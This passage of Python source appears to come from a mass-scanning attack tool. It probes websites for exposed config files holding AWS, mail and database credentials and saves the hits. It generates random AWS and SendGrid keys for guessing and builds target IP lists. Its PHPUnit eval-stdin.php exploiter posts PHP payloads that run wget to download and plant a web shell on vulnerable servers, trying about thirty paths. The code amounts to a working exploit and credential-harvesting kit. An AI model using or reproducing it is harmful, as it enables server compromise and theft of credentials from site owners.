                                                        self.show_status_message(
                                                            time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Ionos",
                                                            status=True,
                                                            mode="Hidden Config Scanner",
                                                        )
                                                        self.write_file(result_ionos, url_config)
                                                    elif "MAIL_PASSWORD" in get_config.text:
                                                        self.show_status_message(
                                                            time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Mail Other",
                                                            status=True,
                                                            mode="Hidden Config Scanner",
                                                        )
                                                        self.write_file(result_mail_other, url_config)
                                                    elif "mandrillapp" in get_config.text:
                                                        self.show_status_message(
                                                            time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Mandrillapp",
                                                            status=True,
                                                            mode="Hidden Config Scanner",
                                                        )
                                                        self.write_file(result_mandrillapp, url_config)
                    
                                                    else:
                                                        if "DB_USERNAME" in get_config.text:
                                                            self.show_status_message(
                                                                time=time_now,
                                                                counter=counter,
                                                                length=length,
                                                                data=url_config,
                                                                message="Found Database",
                                                                status=True,
                                                                mode="Hidden Config Scanner",
                                                            )
                                                            self.write_file(result_database, url_config)
                                                            self.write_file(result_variable, url_config)
                                                            
                                                else:
                                                
                                                    url_config = "/".join([target_url, "config.js"])
                                                    get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)
                                                
                                                    if "ASIA" in get_config.text and "accessKeyId" in get_config.text and "AKIA" in get_config.text:
                                                        
                                                        self.show_status_message(
                                                            time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found AWS",
                                                            status=True,
                                                            mode="Hidden Config Scanner",
                                                        )
                                                        self.write_file(result_aws, url_config)
                                                    
                                                    else:
                                                    
                                                        self.show_status_message(
                                                            time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Not Vuln",
                                                            status=False,
                                                            mode="Hidden Config Scanner",
                                                        )
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(Error).__name__, Error)
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Cannot Connect or Timeout!",
                    status=False,
                    mode="Hidden Config Scanner",
                )
            
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            pass
            

    # IP Checker & Grabber

    def reverse_domain_to_ip(self, counter, length, url):
        try:
            reverse_domain_ip = self.set_result(filename="reverse_domain_to_ip.txt")
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            parse_url = urlparse(url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(url)

            try:
                ip = socket.gethostbyname(
                    target_url.replace("https://", "")
                    .replace("http://", "")
                    .replace("/", "")
                    .strip()
                )
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="IP Address: %s" % ip,
                    status=True,
                    mode="Reverse Domain to IP Address",
                )
                self.write_file(reverse_domain_ip, ip)
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Cannot Connect or Timeout!",
                    status=False,
                    mode="Reverse Domain to IP Address",
                )
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            pass

    def http_port_scanner(self, counter, length, ip_url):
        try:
            
            http_ip_address_live = self.set_result(filename="http_ip_address_live.txt")
            http_ip_address_dead = self.set_result(filename="http_ip_address_dead.txt")

            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            parse_url = urlparse(ip_url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(ip_url)
            try:
                ip = socket.gethostbyname(
                    target_url.replace("https://", "")
                    .replace("http://", "")
                    .replace("/", "")
                    .strip()
                )
                append_url = "http://%s" % ip
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Cache-Control": "max-age=0",
                    "TE": "Trailers",
                }
                response_url = requests.get(url=append_url, headers=headers, timeout=5, verify=False)

                if response_url.status_code < 600:

                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Open",
                        status=True,
                        mode="HTTP IP Address Checker",
                    )
                    self.write_file(http_ip_address_live, ip_url)
                else:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Close",
                        status=False,
                        mode="HTTP IP Address Checker",
                    )
                    self.write_file(http_ip_address_dead, ip_url)

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Cannot Connect or Timeout!",
                    status=False,
                    mode="HTTP IP Address Checker",
                )
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            pass
        
    def aws_generator(self, length, region):
        
        chars = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","/","/"]
        
        def aws_id():
            output = "AKIA"
            for i in range(16):
                output += random.choice(chars[0:38]).upper()
            return output
        
        def aws_key():
            output = ""
            for i in range(40):
                
                if i == 0 or i == 39:
                    randUpper = random.choice(chars[0:38]).upper()
                    output += random.choice([randUpper, random.choice(chars[0:38])])
                else:
                    randUpper = random.choice(chars[0:38]).upper()
                    output += random.choice([randUpper, random.choice(chars)])
                    
            return output
        
        self.show_info_message(message="Generating Total %s Of AWS Key, Please Wait....." % length)
        
        start = time.time()
        save_aws = self.set_result(filename="generated_aws.txt")
        list_map = []
        progress = Progress(
            "[progress.description]{task.description}",
            BarColumn(),
            "[magenta]{task.completed} of {task.total} AWS Key Generated",
            TimeRemainingColumn(),
        )
        
        with progress:
            task = progress.add_task("[%s] %s" % (Color.BLUE("INFO"), Color.WHITE("Generating AWS Key...")), total=int(length))
            
            for key in range(int(length)):
                
                aws_value = "%s|%s|%s" % (aws_id(), aws_key(), region)
                list_map.append(aws_value)
                progress.update(task, advance=1)
            
        self.write_file(save_aws, list_map)
        end = time.time()
        hours, rem = divmod(end - start, 3600)
        minutes, seconds = divmod(rem, 60)
        self.show_info_message(
            "Success, Time Elapsed: {:0>2}:{:0>2}:{:05.2f}".format(
                int(hours), int(minutes), seconds
            )
        )
        self.show_info_message("Result Saved At: %s" % save_aws)
    
    def sendgrid_generator(self, length):
        
        charsend = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","-","_"]
        
        def sendgrid_key():
            
            output = 'SG.'
            for i in range(22):
                ranUpper = random.choice(charsend[0:38]).upper()
                output += random.choice([ranUpper, random.choice(charsend[0:38])])
            output += '.'
            for i in range(43):
                ranUpper = random.choice(charsend[0:38]).upper()
                output += random.choice([ranUpper, random.choice(charsend[0:38])])
            
            return output
            
        
        self.show_info_message(
            message="Generating Total %s Of Sendgrid Key, Please Wait....." % length
        )
        
        start = time.time()
        save_sendgrid = self.set_result(filename="generated_sendgrid.txt")
        list_map = []
        progress = Progress(
            "[progress.description]{task.description}",
            BarColumn(),
            "[magenta]{task.completed} of {task.total} Sendgrid Key Generated",
            TimeRemainingColumn(),
        )
        
        with progress:
            task = progress.add_task("[%s] %s" % (Color.BLUE("INFO"), Color.WHITE("Generating Sendgrid Key...")), total=int(length))

            for key in range(int(length)):
                
                sendgrid_value = sendgrid_key()
                
                list_map.append(sendgrid_value)
                progress.update(task, advance=1)

        self.write_file(save_sendgrid, list_map)
        end = time.time()
        hours, rem = divmod(end - start, 3600)
        minutes, seconds = divmod(rem, 60)
        self.show_info_message(
            "Success, Time Elapsed: {:0>2}:{:0>2}:{:05.2f}".format(
                int(hours), int(minutes), seconds
            )
        )
        self.show_info_message("Result Saved At: %s" % save_sendgrid)
            
    
    def ip_address_generator(self, length):
        self.show_info_message(
            message="Generating Total %s Of IP Address, Please Wait....." % length
        )

        start = time.time()
        generated_ip_address = self.set_result(filename="generated_ip_address.txt")
        list_map = []
        progress = Progress(
            "[progress.description]{task.description}",
            BarColumn(),
            "[magenta]{task.completed} of {task.total} IP Address Generated",
            TimeRemainingColumn(),
        )

        MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES
        with progress:
            task = progress.add_task("[%s] %s" % (Color.BLUE("INFO"), Color.WHITE("Generating IP Address...")), total=int(length))

            for key in range(int(length)):
                ip_address_value = ipaddress.IPv4Address._string_from_ip_int(
                    random.randint(1, MAX_IPV4)
                )
                list_map.append(ip_address_value)
                progress.update(task, advance=1)

        self.write_file(generated_ip_address, list_map)
        end = time.time()
        hours, rem = divmod(end - start, 3600)
        minutes, seconds = divmod(rem, 60)
        self.show_info_message(
            "Success, Time Elapsed: {:0>2}:{:0>2}:{:05.2f}".format(
                int(hours), int(minutes), seconds
            )
        )
        self.show_info_message("Result Saved At: %s" % generated_ip_address)

    def ip_range_generator(self, counter, length, ip_url):
        try:
            ip_address_range_list = self.set_result(filename="ip_address_range_list.txt")
            
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            parse_url = urlparse(ip_url)
            if parse_url.scheme: 
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(ip_url)

            try:
                ip = socket.gethostbyname(
                    target_url.replace("https://", "")
                    .replace("http://", "")
                    .replace("/", "")
                    .strip()
                )

                __split__ = ip.split(".")
                start = "%s.%s.%s.%s" % (
                    __split__[0],
                    __split__[1],
                    __split__[2],
                    __split__[3],
                )
                end = "%s.%s.255.255" % (__split__[0], __split__[1])

                start_int = int(ip_address(start).packed.hex(), 16)
                end_int = int(ip_address(end).packed.hex(), 16)

                ip_list = [ip_address(ip).exploded for ip in range(start_int, end_int)]
                ip_length = len(list(ip_list))

                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Found %s Address" % ip_length,
                    status=True,
                    mode="IP Address Range Generator",
                )
                self.write_file(ip_address_range_list, ip_list)

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Cannot Connect or Timeout",
                    status=False,
                    mode="IP Address Range Genenerator",
                )
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            pass

    # Exploiter

    def phpunit_exploiter(self, counter, length, data):
        payloads = {
            'test': '<?php  echo \'RCE_VULN|\'; echo php_uname();?>',
            'default': '<?php  @system(sprintf(\'wget -O %s {{shell}}  '
                   '--no-check-certificate\', join(DIRECTORY_SEPARATOR,array(__DIR__,'
                   '\'{{shellname}}\'))));echo file_exists(join(DIRECTORY_SEPARATOR,array(__DIR__,'
                   '\'{{shellname}}\')))?\'RCE_VULN\' : \'FAILED\';?>',
            'laravel': '<?php   @system(sprintf(\'wget -O %s {{shell}} '
                   '--no-check-certificate\', is_writable(__DIR__) ? \'{{shellname}}\' : join('
                   'DIRECTORY_SEPARATOR,array(preg_replace(\'%vendor\/[^\n]+%\', '
                   '\'storage/framework/\',__DIR__),\'{{shellname}}\'))));echo file_exists(is_writable('
                   '__DIR__) ? \'{{shellname}}\' : join(DIRECTORY_SEPARATOR,array(preg_replace('
                   '\'%vendor\/[^\n]+%\', \'storage/framework/\',__DIR__),'
                   '\'{{shellname}}\')))?\'RCE_VULN\' : \'FAILED\';?>',
            'drupal': '<?php   @system(sprintf(\'wget -O %s {{shell}} '
                  '--no-check-certificate\', is_writable(__DIR__) ? \'{{shellname}}\' : join('
                  'DIRECTORY_SEPARATOR,array(preg_replace(\'%\/sites/all/[^\n]+%\',\'/sites/default/files/\','
                  '__DIR__),\'{{shellname}}\'))));echo file_exists(is_writable('
                  '__DIR__) ? \'{{shellname}}\' : join(DIRECTORY_SEPARATOR,array(preg_replace('
                  '\'%\/sites/all/[^\n]+%\', \'/sites/default/files/\',__DIR__),'
                  '\'{{shellname}}\')))?\'RCE_VULN\' : \'FAILED\';?>',
        }
        path = [
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
            "/vendor/phpunit/src/Util/PHP/eval-stdin.php",
            "/vendor/phpunit/Util/PHP/eval-stdin.php",
            "/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/phpunit/phpunit/Util/PHP/eval-stdin.php",
            "/phpunit/src/Util/PHP/eval-stdin.php",
            "/phpunit/Util/PHP/eval-stdin.php",
            "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/lib/phpunit/phpunit/Util/PHP/eval-stdin.php",
            "/lib/phpunit/src/Util/PHP/eval-stdin.php",
            "/lib/phpunit/Util/PHP/eval-stdin.php",
            "/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        ]
        parse_url = urlparse(data)
        if parse_url.scheme:
            target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
        else:
            target_url = "http://{}".format(data)

        payloads = {
            k: v.replace("{{shell}}", self.SHELL_CODE).replace(
                "{{shellname}}", self.SHELL_NAME
            )
            for k, v in payloads.items()
        }
        payload_test = payloads.get("test")
        payload = payloads.get("default")
        phpunit_rce_live = self.set_result(filename="phpunit_rce_live.txt")
        phpunit_rce_dead = self.set_result(filename="phpunit_rce_dead.txt")
        time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            request = requests.Session()
            for rce in path:
                rce_bug = "".join([target_url, rce])
                try:
                    headers = {
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Connection": "keep-alive",
                        "Upgrade-Insecure-Requests": "1",
                        "Cache-Control": "max-age=0",
                        "TE": "Trailers",
                    }
                    res_check = request.post(
                        rce_bug,
                        timeout=5,
                        verify=False,
                        allow_redirects=False,
                        headers=headers,
                        data=payload_test,
                    )
                    raw_check = res_check.content.decode(encoding="utf-8", errors="ignore")

                    rce_vuln = "RCE_VULN" in raw_check and not re.search(r"(\?>|<[^\n]+>)", raw_check, re.MULTILINE)

                    if rce_vuln:
                        try:
                            if (rce == "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"):
                                payload = payloads.get("laravel")
                            elif (rce == "/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"):
                                payload = payloads.get("drupal")

                            res_rce = request.post(
                                rce_bug,
                                timeout=5,
                                verify=False,
                                allow_redirects=False,
                                headers=headers,
                                data=payload
                            )
                            rce_raw = res_rce.content.decode(encoding="utf-8", errors="ignore")

                            if "RCE_VULN" in rce_raw:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=rce_bug,
                                    message="Shell Uploaded",
                                    status=True,
                                    mode="PHPUnit Remote Code Excution",
                                )
                                if (rce == "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"):
                                    self.write_file(phpunit_rce_live, re.sub(r"vendor\/[^\n]+", 'storage/framework/%s' % self.SHELL_FILENAME, rce_bug))

                                elif (rce == "/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"):
                                    self.write_file(phpunit_rce_live, re.sub(r"\/sites/all\/[^\n]+", '/sites/default/files//%s' % self.SHELL_NAME, rce_bug))
                                else:
                                    self.write_file(phpunit_rce_live, rce_bug.replace("eval-stdin.php", self.SHELL_NAME))
                            else:
                                self.show_status_message(
                                    time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=rce_bug,
                                    message="Failed Upload Shell",
                                    status=False,
                                    mode="PHPUnit Remote Code Excution",
                                )
                                self.write_file(phpunit_rce_dead, rce_bug)
                        except:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=rce_bug,
                                message="Remote Code Execution Failed",
                                status=False,
                                mode="PHPUnit Remote Code Excution",
                            )
                            self.write_file(phpunit_rce_dead, rce_bug)
                            pass
                    else:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=rce_bug,
                            message="Not Vuln",
                            status=False,
                            mode="PHPUnit Remote Code Excution",
                        )
                        self.write_file(phpunit_rce_dead, rce_bug)
                except KeyboardInterrupt:
                    raise KeyboardInterrupt
                except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=data,
                        message="Cannot Connect or Timeout!",
                        status=False,
                        mode="PHPUnit Remote Code Excution",
                    )
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            pass

    # checker & osint

    def subdomain_enumeration_scanner(self, counter, length, domain):
        try:
            subdomain_live = self.set_result(filename="subdomain_enumeration.txt")

            parse_url = urlparse(domain)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(domain)

            url = (
                target_url.replace("http://", "")
                .replace("https://", "")
                .replace("/", "")
                .strip()
            )
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Cache-Control": "max-age=0",
                    "TE": "Trailers",
                }
                request = requests.get(
                    url="https://sonar.omnisint.io/subdomains/%s" % url, headers=headers
                )
                try:
                    parse_json = json.loads(request.text)
                    length_json = len(list(parse_json))
                except:
                    parse_json = False

                if parse_json:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Found %s Subdomain" % length_json,
                        status=True,
                        mode="Subdomain Enumeration Scanner",
                    )
                    self.write_file(subdomain_live, parse_json)
                else:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Not Found",
                        status=False,
                        mode="Subdomain Enumeration Scanner",
                    )

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Cannot Connect or Timeout",
                    status=False,
                    mode="Subdomain Enumeration Scanner",
                )

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))

    def cms_scanner(self, counter, length, url):
        cms_regex = {
            "Wordpress": '(wp-content\/(themes|plugins|mu\-plugins)\/[^\n\s]+\.(js|css)|name\="generator"\scontent\="WordPress|\/xmlrpc\.php)',
            "Joomla": '(var\sJoomla|name\="generator[^\n]+Joomla!|\/com\_[a-z0-9]+\/)',
            "Drupal": '(\/sites\/default\/files|extend\(Drupal|node_link_text|name\="generator[^\n><]+(Drupal\s([^\s,]+)))',
            "MediaWiki": '(name\="generator[^\n]+MediaWiki|mediawiki\.(user|hidpi|searchSuggest)|Powered\sby\sMediaWiki|mw\.user\.tokens)',
            "PrestaShop": '(modules?\/(tmsearch|topbanner|gsnippetsreviews)\/(search|FrontAjaxTopbanner|views)|comparedProductsIds\=\[\]|var\scomparator_max_item|name\="generator"[^\n]+PrestaShop|license@prestashop\.com|@copyright[^\n]+PrestaShop|var\sprestashop_version)',
            "ZenCart": '(name\="generator[^\n]+(Zen\sCart|The\sZen\sCart|zen\-cart\.com\seCommerce)|products\_id\=[^=]+zenid|zencart\/|main_page=[^=]+cPath\=\d)',
            "vBulletin": '(name\="generator[^\n]+vBulletin|[^\n]"vbulletinlink|vb_login_[^\s]+|vbulletin\-core)',
            "Discuz": '(name\="generator[^\n]+Discuz|discuz_uid|discuz_tips)',
            "Magento": "(Mage\.Cookies\.)",
            "Invision": "(<([^<]+)?(Invision\sPower)([^>]+)?>|ipb\_[^\n'=\s]+)",
            "OpenCart": '(name\="generator[^\n]+OpenCart|index\.php\?route=(common|checkout|account)|catalog\/view\/theme\/[^\s\n]+\.(js|css|png|jpg))',
            "phpBB": '(name\="generator[^\n]+phpbb|Powered\sby[^\n]+(phpBB|phpbb\.com)|viewtopic\.php\?f=\d+)',
            "Whmcs": "(templates\/.*(pwreset|dologin|submitticket|knowledgebase)\.php)",
            "Moodle": "(\^moodle-/|moodle-[a-z0-9_-]+)",
            "YetAnotherForum": "(\syaf\.controls\.SmartScroller|\syaf_[a-z0-9_-]+)",
            "Jive": "(jive([^a-z]+)(app|Onboarding|nitro|rest|rte|ext))",
            "Lithium": "(LITHIUM\.(DEBUG|Loader|Auth|Components|Css|useCheckOnline|RenderedScripts))",
            "Esportsify": "esportsify\.com/([^.]+).(js|css)",
            "FluxBB": "(<p[^\n]+FluxBB)",
            "osCommerce": '(oscsid\=[^"]+)',
            "Ning": "(([a-z0-9-]+)\.ning\.com|ning\.(loader)|ning\._)",
            "Zimbra": '(\=new\sZmSkin\(\)|iconURL\:"\/img\/logo\/ImgZimbraIcon)',
        }
        time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        parse_url = urlparse(url)
        if parse_url.scheme:
            target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
        else:
            target_url = "http://{}".format(url)
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0",
                "TE": "Trailers",
            }
            http_request = requests.Session()
            response = http_request.get(
                url=target_url,
                timeout=5,
                verify=False,
                allow_redirects=True,
                headers=headers,
            )
            raw = response.content.decode(encoding="utf-8", errors="ignore")
            for cms, regex in cms_regex.items():
                try:
                    if re.search(r"%s" % regex, raw):
                        cms_name = self.set_result(filename="cms_%s.txt" % cms)
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=target_url,
                            message=cms,
                            status=True,
                            mode="CMS Scanner",
                        )
                        self.write_file(cms_name, target_url)
                        break
                    else:
                        check_cookies = http_request.cookies
                        if check_cookies.get("laravel_session"):
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Laravel",
                                status=True,
                                mode="CMS Scanner",
                            )
                            cms_name = self.set_result(filename="cms_laravel.txt")
                            self.write_file(cms_name, target_url)
                            break
                        elif check_cookies.get("ZM_LOGIN_CSRF"):
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Zimbra",
                                status=True,
                                mode="CMS Scanner",
                            )
                            cms_name = self.set_result(filename="cms_zimbra.txt")
                            self.write_file(cms_name, target_url)
                            break
                        elif check_cookies.get("ci_session"):
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Codeigniter",
                                status=True,
                                mode="CMS Scanner",
                            )
                            cms_name = self.set_result(filename="cms_codeigniter.txt")
                            self.write_file(cms_name, target_url)
                            break
                        else:
                            continue
                        
                except Exception as Error:
                    print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))

        except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
            self.show_status_message(
                time=time_now,
                counter=counter,
                length=length,
                data=target_url,
                message="Cannot Connect or Timeout",
                status=False,
                mode="CMS Scanner",
            )
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))

    def reverse_ip_address_sonar(self, counter, length, domain):
        try:
            
            sonar_live = self.set_result(filename="reverse_rapid7_live.txt")
            sonar_dead = self.set_result(filename="reverse_rapid7_dead.txt")
            
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            parse_url = urlparse(domain)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(domain)
            try:
                ip = socket.gethostbyname(
                    target_url.replace("https://", "")
                    .replace("http://", "")
                    .replace("/", "")
